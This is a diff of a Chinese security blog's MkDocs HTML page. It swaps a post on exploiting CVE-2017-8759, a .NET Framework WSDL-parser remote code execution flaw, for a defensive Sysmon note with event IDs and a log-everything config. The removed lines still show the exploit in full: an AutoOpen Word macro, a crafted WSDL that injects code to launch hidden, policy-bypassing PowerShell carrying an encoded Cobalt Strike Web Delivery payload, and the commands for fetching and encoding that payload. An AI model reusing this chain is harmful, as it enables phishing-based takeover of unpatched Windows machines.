@@ -8,7 +8,7 @@
   
   <meta name="author" content="c4bbage">
   
-  <title>CVE-2017-8759 利用方法 - c4bbage blog</title>
+  <title>sysmon 笔记 - c4bbage blog</title>
   
 
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -23,9 +23,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "CVE-2017-8759 利用方法";
-    var mkdocs_page_input_path = "CVE-2017-8759.md";
-    var mkdocs_page_url = "/CVE-2017-8759/";
+    var mkdocs_page_name = "sysmon 笔记";
+    var mkdocs_page_input_path = "sysmon_note.md";
+    var mkdocs_page_url = "/sysmon_note/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js"></script>
@@ -131,30 +131,32 @@
 
         
             
-    <li class="toctree-l1 current">
-        <a class="current" href="./">CVE-2017-8759 利用方法</a>
-        
-            <ul>
-            
-                <li class="toctree-l3"><a href="#cve-2017-8759">CVE-2017-8759</a></li>
-                
-                    <li><a class="toctree-l4" href="#_1">简介</a></li>
-                
-                    <li><a class="toctree-l4" href="#_2">利用方法(宏，会有提示)</a></li>
-                
-                    <li><a class="toctree-l4" href="#fireeye">fireeye利用方式</a></li>
-                
-                    <li><a class="toctree-l4" href="#_3">引用</a></li>
-                
-            
-            </ul>
+    <li class="toctree-l1 ">
+        <a class="" href="../CVE-2017-8759/">CVE-2017-8759 利用方法</a>
         
     </li>
 
         
             
-    <li class="toctree-l1 ">
-        <a class="" href="../sysmon_note/">sysmon 笔记</a>
+    <li class="toctree-l1 current">
+        <a class="current" href="./">sysmon 笔记</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#sysmon">Sysmon</a></li>
+                
+                    <li><a class="toctree-l4" href="#sysmon_1">Sysmon 功能:</a></li>
+                
+                    <li><a class="toctree-l4" href="#sysmon-id">Sysmon 事件ID</a></li>
+                
+                    <li><a class="toctree-l4" href="#logs-anything">Logs anything</a></li>
+                
+                    <li><a class="toctree-l4" href="#_1">使用</a></li>
+                
+                    <li><a class="toctree-l4" href="#_2">参考</a></li>
+                
+            
+            </ul>
         
     </li>
 
@@ -303,7 +305,7 @@
         
       
     
-    <li>CVE-2017-8759 利用方法</li>
+    <li>sysmon 笔记</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -313,91 +315,228 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="cve-2017-8759">CVE-2017-8759</h1>
+                <h1 id="sysmon">Sysmon</h1>
 <ul>
-<li>作者:c4bbage</li>
-<li>时间:2017.9.14</li>
-<li>链接:http://dobest1.com/CVE-2017-8759</li>
+<li>作者: c4bbage</li>
+<li>时间: 2017.8.17</li>
+<li>链接: http://dobest1.com/sysmon_note/</li>
 </ul>
-<h2 id="_1">简介</h2>
-<p>FireEye 最近检测到一个恶意的Microsoft Office RTF文档，利用CVE-2017-8759 WSDL解析器代码注入PrintClientProxy方法中的WSDL解析器模块中存在代码注入漏洞。如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。这就造成了攻击者注入和执行任意代码。</p>
-<p>基本信息 <em>基本信息抄自猎户攻防实验室</em><br />
-漏洞名称：.NET Framework远程代码执行漏洞<br />
-漏洞编号：CVE-2017-8759<br />
-漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统<br />
-利用场景：远程钓鱼、社会工程（打开有惊喜哟）  </p>
-<p>影响版本：以下.NET版本 </p>
+<h2 id="sysmon_1">Sysmon 功能:</h2>
 <ul>
-<li>Microsoft .NET Framework 4.6.2  </li>
-<li>Microsoft .NET Framework 4.6.1  </li>
-<li>Microsoft .NET Framework 3.5.1  </li>
-<li>Microsoft .NET Framework 4.7  </li>
-<li>Microsoft .NET Framework 4.6  </li>
-<li>Microsoft .NET Framework 4.5.2  </li>
-<li>Microsoft .NET Framework 3.5  </li>
-<li>Microsoft .NET Framework 2.0 SP2  </li>
+<li>完整的记录当前进程的及其父进程的命令行和参数</li>
+<li>使用 SHA1(默认)、MD5、SHA256 或IMPHASH来记录进程的文件hash</li>
+<li>多个hash可以用于同一记录中</li>
+<li>在进程创建事件中，包括进程 GUID，GUID可以便于进行上下文关联，不用担心进程ID的变更</li>
+<li>在加载驱动或DLL时，会记录其签名和hash</li>
+<li>记录打开磁盘和卷的原始访问</li>
+<li>可选地记录网络连接，包括每个连接的源进程，IP地址，端口号，主机名和端口名称。</li>
+<li>检测文件创建时间的变化，以了解文件何时真正的被创建。文件创建时间戳的修改是恶意软件通常用于覆盖其行径的技术。</li>
+<li>如果在注册表中更改，则自动重新加载配置。</li>
+<li>规则过滤支持动态包含或排除某些事件。</li>
+<li>从早于进程启动时生成事件，以捕获甚至复杂的内核模式恶意软件所产生的活动。 </li>
 </ul>
-<p>影响产品：<br />
-- Office(word excel)Edge IE WinOS Skype Lync Sharepoint</p>
-<p>加固方法：<br />
-- https://portal.msrc.microsoft.com/en-us/security-guidance</p>
-<h2 id="_2">利用方法(宏，会有提示)</h2>
-<p><em>这个方法不是fireeye报告中样本利用的方式。</em></p>
-<p>新建word宏文档，建立宏AutoOpen</p>
-<pre><code>Sub AutoOpen()
-Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:3333/exploit.txt&quot;)
-End Sub
+<h2 id="sysmon-id">Sysmon 事件ID</h2>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>EventID</th>
+<th>Tag</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Process Create</td>
+<td>1</td>
+<td>ProcessCreate</td>
+</tr>
+<tr>
+<td>File Creation Time Changed</td>
+<td>2</td>
+<td>FileCreateTime</td>
+</tr>
+<tr>
+<td>Process Terminated</td>
+<td>5</td>
+<td>ProcessTerminate</td>
+</tr>
+<tr>
+<td>Driver Loaded</td>
+<td>6</td>
+<td>DriverLoad</td>
+</tr>
+<tr>
+<td>Image Loaded</td>
+<td>7</td>
+<td>ImageLoad</td>
+</tr>
+<tr>
+<td>Network Connection</td>
+<td>3</td>
+<td>NetworkConnect</td>
+</tr>
+<tr>
+<td>CreateRemoteThread</td>
+<td>8</td>
+<td>CreateRemoteThread</td>
+</tr>
+<tr>
+<td>RawAccessRead</td>
+<td>9</td>
+<td>RawAccessRead</td>
+</tr>
+<tr>
+<td>Sysmon Service State Change</td>
+<td>4</td>
+<td></td>
+</tr>
+<tr>
+<td>Process Access</td>
+<td>10</td>
+<td>ProcessAccess</td>
+</tr>
+<tr>
+<td>File Create</td>
+<td>11</td>
+<td>FileCreate</td>
+</tr>
+<tr>
+<td>Registry Object Create Delete</td>
+<td>12</td>
+<td>RegistryEvent</td>
+</tr>
+<tr>
+<td>Registry Value Create</td>
+<td>13</td>
+<td>RegistryEvent</td>
+</tr>
+<tr>
+<td>Registry Object Rename</td>
+<td>14</td>
+<td>RegistryEvent</td>
+</tr>
+<tr>
+<td>File Create Stream Hash</td>
+<td>15</td>
+<td>FileCreateStreamHash</td>
+</tr>
+<tr>
+<td>Sysmon Configuration Changed</td>
+<td>16</td>
+<td></td>
+</tr>
+<tr>
+<td>Pipe Created</td>
+<td>17</td>
+<td>PipeEvent</td>
+</tr>
+<tr>
+<td>Pipe Connected</td>
+<td>18</td>
+<td>PipeEvent</td>
+</tr>
+<tr>
+<td>WmiEventFilter activity detected</td>
+<td>19</td>
+<td>WmiEvent</td>
+</tr>
+<tr>
+<td>WmiEventConsumer activity detected</td>
+<td>20</td>
+<td>WmiEvent</td>
+</tr>
+<tr>
+<td>WmiEventConsumerToFilter activity detected</td>
+<td>21</td>
+<td>WmiEvent</td>
+</tr>
+<tr>
+<td>Error</td>
+<td>255</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="logs-anything">Logs anything</h2>
+<pre><code class="xml">&lt;Sysmon schemaversion=&quot;3.4&quot;&gt;
+  &lt;!-- Capture All Hashes --&gt;
+  &lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt;
+  &lt;EventFiltering&gt;
 
+      &lt;!-- EventID: 1 --&gt;
+      &lt;!-- Log all process creation --&gt;
+      &lt;ProcessCreate onmatch=&quot;exclude&quot;/&gt;
+
+      &lt;!-- EventID: 2 --&gt;
+      &lt;!-- Log all file creation time stamps --&gt;
+      &lt;FileCreateTime onmatch=&quot;exclude&quot;/&gt;
+
+      &lt;!-- EventID: 3 --&gt;
+      &lt;!-- Log all network connections --&gt;
+      &lt;NetworkConnect onmatch=&quot;exclude&quot;/&gt;
+
+      &lt;!-- EventID: 5 --&gt;
+      &lt;!-- Log all process termination --&gt;
+      &lt;ProcessTerminate onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 6 --&gt;
+      &lt;!-- Log all Drivers Loaded --&gt;
+      &lt;DriverLoad onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 7 --&gt;
+      &lt;!-- Log all image loaded--&gt;
+      &lt;ImageLoad onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 8 --&gt;
+      &lt;!-- Log all RemoteThread created --&gt;
+      &lt;CreateRemoteThread onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 9 --&gt;
+      &lt;!-- Log all --&gt;
+      &lt;RawAccessRead onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 10 --&gt;
+      &lt;!-- Log all --&gt;
+      &lt;ProcessAccess onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 11 --&gt;
+      &lt;!-- Log all --&gt;
+      &lt;FileCreate onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 12/13/14 --&gt;
+      &lt;!-- Log all registry operations --&gt;
+      &lt;RegistryEvent onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 15 --&gt;
+      &lt;!-- Log all --&gt;
+      &lt;FileCreateStreamHash onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 17/18 --&gt;
+      &lt;!-- Log all --&gt;
+      &lt;PipeEvent onmatch=&quot;exclude&quot; /&gt;
+
+      &lt;!-- EventID: 19/20/21 --&gt;
+      &lt;!-- Log all --&gt;
+      &lt;WmiEvent onmatch=&quot;exclude&quot; /&gt;
+
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;
 </code></pre>
 
-<p>由于采用mshta，已经开始被各种安全防护设施查杀，一般环境建议更换为powershell，exploit.txt代码如下
-<code>会有弹窗，可以更换为其他方式rundll32</code></p>
-<pre><code>&lt;definitions
-    xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;
-    xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;
-    xmlns:suds=&quot;http://www.w3.org/2000/wsdl/suds&quot;
-    xmlns:tns=&quot;http://schemas.microsoft.com/clr/ns/System&quot;
-    xmlns:ns0=&quot;http://schemas.microsoft.com/clr/nsassem/Logo/Logo&quot;&gt;
-    &lt;portType name=&quot;PortType&quot;/&gt;
-    &lt;binding name=&quot;Binding&quot; type=&quot;tns:PortType&quot;&gt;
-        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;
-        &lt;suds:class type=&quot;ns0:Image&quot; rootType=&quot;MarshalByRefObject&quot;&gt;&lt;/suds:class&gt;
-    &lt;/binding&gt;
-    &lt;service name=&quot;Service&quot;&gt;
-        &lt;port name=&quot;Port&quot; binding=&quot;tns:Binding&quot;&gt;
-            &lt;soap:address location=&quot;http://127.0.0.1:8080?c:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe? -exec bypass -nop -w hidden -ENC XXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;/&gt;
-                        &lt;soap:address location=&quot;;
-                        if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
-                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
-                                System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
-                        } //&quot;/&gt;
-        &lt;/port&gt;
-    &lt;/service&gt;
-&lt;/definitions&gt; 
-</code></pre>
-
-<p>XXXXXXXXXXXXXXXXXXXXXXXXXXX 为base64的cobalt strike Web Delivery(powershell 代码)<br />
-获取cobalt strike Web Delivery 代码  </p>
-<pre><code>curl -H 'User-Agent:' xx.xxx.xxx.xx/a &gt; cs.ps1
-
-$c = Get-Content 'cs.ps1'
-$b = [System.Text.Encoding]::Unicode.GetBytes($c.Trim())
-$en =[Convert]::ToBase64String($b)
-$en | Out-File &quot;cs.ps1.b64&quot;
-</code></pre>
-
-<h2 id="fireeye">fireeye利用方式</h2>
+<h2 id="_1">使用</h2>
+<p>输出当前配置<br />
+    sysmon -c<br />
+使用默认配置<br />
+    sysmon.exe -i --<br />
+更改配置以使用Lsass中的所有散列，无网络监控和DLL监控<br />
+    sysmon –c –h * –l lsass.exe  </p>
+<h2 id="_2">参考</h2>
 <ul>
-<li><a href="http://www.lz1y.cn/wordpress/?p=799">CVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁</a></li>
-<li><a href="https://github.com/vysec/CVE-2017-8759">vysec/CVE-2017-8759 ole</a>  </li>
-<li><a href="http://fuping.site/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/">CVE-2017-0199漏洞复现过程</a></li>
-</ul>
-<h2 id="_3">引用</h2>
-<ul>
-<li><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html">火眼报告</a></li>
-<li><a href="">微软.NET远程代码执行漏洞0day分析（社工钓鱼）猎户攻防实验室</a></li>
-<li><a href="https://github.com/Voulnet/CVE-2017-8759-Exploit-sample">Voulnet/CVE-2017-8759-Exploit-sample 宏</a></li>
-<li><a href="https://github.com/vysec/CVE-2017-8759">vysec/CVE-2017-8759 ole</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon v6.10</a></li>
+<li><a href="https://github.com/0xrawsec/sysmon-config">Sysmon config</a></li>
+<li><a href="https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml">SwiftOnSecurity sysmonconfig</a></li>
+<li><a href="https://www.slideshare.net/nahidupa/threat-hunting-throwing-arrow-hunting-for-adversaries-in-your-it-environment">Threat hunting != Throwing arrow! Hunting for adversaries in your it environment</a></li>
+<li><a href="https://github.com/Cyb3rWard0g/ThreatHunter-Playbook/tree/master/tactical_groups/lateral_movement">ThreatHunter Playbook</a></li>
 </ul>
               
             </div>
@@ -406,10 +545,10 @@ $en | Out-File &quot;cs.ps1.b64&quot;
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../sysmon_note/" class="btn btn-neutral float-right" title="sysmon 笔记">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" class="btn btn-neutral float-right" title="用Burpsuite 来处理csrf token">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../doublepulsar-smb-implant-detection-from-and-eventlog-detection/" class="btn btn-neutral" title="使用Volatility检测DoublePulsar SMB 和日志审查"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../CVE-2017-8759/" class="btn btn-neutral" title="CVE-2017-8759 利用方法"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -435,10 +574,10 @@ $en | Out-File &quot;cs.ps1.b64&quot;
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../doublepulsar-smb-implant-detection-from-and-eventlog-detection/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../CVE-2017-8759/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../sysmon_note/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
